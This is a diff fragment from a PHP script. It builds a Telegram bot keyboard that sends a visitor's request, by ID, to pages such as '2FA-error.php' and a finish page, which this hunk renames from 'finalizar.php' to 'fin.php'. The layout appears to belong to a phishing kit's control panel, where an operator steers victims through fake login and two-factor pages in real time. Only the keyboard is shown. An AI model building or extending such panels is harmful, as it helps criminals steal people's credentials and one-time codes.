@@ -162,7 +162,7 @@ $keyboard = [
             ['text' => '『🚫』2𝖥𝖠 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:2FA-error.php"]
         ],
         [
-            ['text' => '『🏁』𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:finalizar.php"]
+            ['text' => '『🏁』𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:fin.php"]
         ]
     ]
 ];
